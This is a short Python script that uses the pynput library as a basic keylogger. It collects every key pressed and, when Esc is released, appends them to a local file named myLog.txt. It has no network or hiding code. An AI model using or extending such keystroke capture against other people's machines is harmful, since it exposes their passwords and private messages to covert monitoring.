import pynput

from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)

def write_file(keys):
    # print(str(keys))
    with open("myLog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","").replace("Key.space"," ")
            f.write(k)

def on_release(key):
    global keys
    # print(str(keys) + "\n")
    if key == Key.esc:
        write_file(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()